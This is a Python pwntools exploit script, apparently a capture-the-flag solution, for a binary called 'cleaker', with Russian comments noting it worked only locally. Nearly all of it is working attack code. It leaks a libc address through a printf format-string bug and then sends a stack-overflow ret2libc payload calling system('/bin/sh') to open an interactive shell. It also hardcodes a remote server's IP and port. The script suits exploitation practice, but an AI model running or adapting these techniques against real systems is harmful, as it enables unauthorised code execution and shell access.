#!/usr/bin/env python3

# в этой таске орги накосячили, и поэтому удаленно я так и не запывнил
# а на локально на своей либсе все ок
# локальная: libc.so.6
# удаленная: libc-2.31.so


from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./cleaker.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11674)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

g_pop_rdi = 0x4011C0

# смотрим в иде по какому смещению на стеке относительно rsp лежит __libc_start_main+80
# руками (на калькуляторе) высчитываем какой это аргумент у для printf. %43$p
# пробуем несколько раз скормить это проге. каждый раз последние полтора байта равны 0x190
# значит все ок. Далее:
# вычитаем 0x80 и получаем __libc_start_main = 0x7f....320
# теперь открываем в иде libc
# и получаем: 
#libc_start_main_offs = 0x26FC0
#system_offs          = 0x55410
#str_bin_sh           = 0x1B75AA
#retn_offs            = 0x1111EF

# LOCAL
libc_start_main_offs = 0x29DC0 
system_offs = 0x50D60
str_bin_sh  = 0x1D8698
retn_offs   = 0x114A3F


# пишем эксплойт
io.recvuntil(b'Use printf power to find some libc function on stack: ')
io.sendline(b'%43$p')

libc_start_main_cur  = int(io.recvline(), 16) - 0x80

# ликнули libc_start_main
# теперь посчитаем libc_base и system_libc

libc_base = libc_start_main_cur - libc_start_main_offs

pl  = b''
pl += b'A'*128
pl += p64(0)                       # rbp
pl += p64(libc_base + retn_offs)   # поправить стек (тупо ret)
pl += p64(g_pop_rdi)               # go to gadget
pl += p64(libc_base + str_bin_sh)  # rdi
pl += p64(libc_base + system_offs) # execute system("/bin/sh")
pl += b'\n'

io.recvuntil(b'Now use gets power to make your ret2libc: ')
io.send(pl)
io.interactive()